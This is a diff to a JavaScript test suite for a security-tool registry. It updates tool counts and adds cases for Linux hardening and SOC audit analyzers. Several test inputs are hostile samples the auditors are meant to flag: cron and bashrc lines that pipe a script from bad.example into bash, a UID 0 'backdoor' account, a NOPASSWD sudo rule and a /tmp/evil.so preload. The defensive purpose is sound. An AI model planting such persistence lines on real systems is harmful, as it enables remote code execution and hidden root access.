@@ -205,12 +205,12 @@ test('homepage search and quick-access deep links resolve to real tool workspace
 test('tool registry has unique IDs and ten declared workspaces', () => {
   const ids = tools.map(tool => tool.id);
   assert.equal(new Set(ids).size, ids.length);
-  assert.equal(tools.length, 130);
+  assert.equal(tools.length, 151);
   assert.deepEqual(
     [...new Set(tools.map(tool => tool.cat))].sort(),
     ['bash','cloud','database','developer','kali','linux','networking','security','soc','ubuntu'].sort(),
   );
-  const expected={networking:18,security:18,soc:7,linux:24,ubuntu:12,kali:20,bash:17,developer:11,cloud:2,database:1};
+  const expected={networking:18,security:27,soc:11,linux:27,ubuntu:12,kali:20,bash:19,developer:13,cloud:3,database:1};
   for(const [category,count] of Object.entries(expected))
     assert.equal(tools.filter(tool=>tool.cat===category).length,count,category+' tool count');
 });
@@ -381,7 +381,7 @@ test('query string builder safely encodes values and preserves duplicate keys', 
 
 
 test('every registered utility has a unique ID, description, category and executable handler', () => {
-  assert.equal(tools.length, 130);
+  assert.equal(tools.length, 151);
   for (const tool of tools) {
     assert.match(tool.id, /^[a-z0-9-]+$/);
     assert.ok(tool.name && tool.name.length >= 5, tool.id + ' has a useful name');
@@ -761,6 +761,37 @@ test('new Linux, Kali and Termux command builders produce bounded commands witho
   assert.throws(()=>byId('linux-curl-security-headers').run({url:'https://user:pass@example.com'}),/without embedded credentials/);
   assert.match(byId('linux-yara-file-scan').run({rules:'rules.yar',target:'sample.bin'}),/yara -s 'rules.yar' 'sample.bin'/);
   assert.match(byId('termux-environment-audit').run({}),/uname -a/);
+});
+
+
+test('Linux hardening, DevSecOps and SOC analyzers return bounded local findings', () => {
+  const cases = [
+    ['linux-sudoers-audit',{config:'alice ALL=(ALL) NOPASSWD: ALL'},/passwordless sudo grant/],
+    ['linux-passwd-audit',{data:'root:x:0:0:root:/root:/bin/bash\nbackdoor:x:0:0::/root:/bin/bash'},/unexpected UID 0 account/],
+    ['linux-authorized-keys-audit',{data:'ssh-dss AAAAB3NzaC1kc3MAAACBAQ demo'},/DSA key type is obsolete/],
+    ['linux-capabilities-audit',{data:'/usr/bin/test cap_sys_admin,cap_setuid=ep'},/cap_sys_admin/],
+    ['linux-cron-audit',{data:'@reboot root curl https://bad.example/x | bash'},/download-and-execute|network utility|dynamic command execution/i],
+    ['linux-systemd-hardening-audit',{unit:'[Service]\nUser=root'},/Prevent privilege gain/],
+    ['linux-nginx-config-audit',{config:'server { autoindex on; }'},/Directory listing disabled/],
+    ['linux-apache-config-audit',{config:'Options Indexes\nTraceEnable On'},/Directory indexing disabled/],
+    ['linux-apt-source-audit',{data:'deb [trusted=yes] http://mirror.example stable main'},/plaintext HTTP/],
+    ['linux-gitignore-audit',{data:'node_modules/'},/missing environment files pattern/],
+    ['git-diff-secret-audit',{diff:'+API_TOKEN=super-secret-value'},/value redacted/],
+    ['env-file-audit',{data:'API_TOKEN=super-secret-value'},/API_TOKEN contains a configured value \(redacted\)/],
+    ['docker-compose-audit',{yaml:'services:\n  web:\n    privileged: true\n    image: web:latest'},/Privileged container/],
+    ['sigma-rule-audit',{yaml:'title: test\nid: abc\nstatus: experimental\nlogsource:\n  product: windows\ndetection:\n  condition: selection'},/status is experimental/],
+    ['suricata-eve-summary',{data:'{"event_type":"alert","alert":{"signature":"test alert"}}\ninvalid'},/Alerts: 1/],
+    ['zeek-conn-summary',{data:'#fields\tts\torig_h\tresp_h\tservice\tconn_state\n1\t192.0.2.1\t198.51.100.1\tssl\tSF'},/Services: ssl=1/],
+    ['termux-bashrc-audit',{data:'curl https://bad.example/install.sh | bash'},/remote content piped to a shell/],
+    ['android-manifest-audit',{xml:'<uses-permission android:name="android.permission.READ_SMS"/>'},/android.permission.READ_SMS/],
+    ['linux-sysctl-audit',{data:'net.ipv4.ip_forward = 1'},/IPv4 forwarding enabled/],
+    ['linux-umask-audit',{mask:'000'},/no permission bits are masked/],
+    ['linux-ld-preload-audit',{data:'/tmp/evil.so'},/unexpected preload path/],
+  ];
+  for (const [id,input,expected] of cases) {
+    const output=byId(id).run(input);
+    assert.match(output,expected,id+' finding');
+  }
 });
 
 test('new tool categories are present in the registry and homepage navigation', () => {
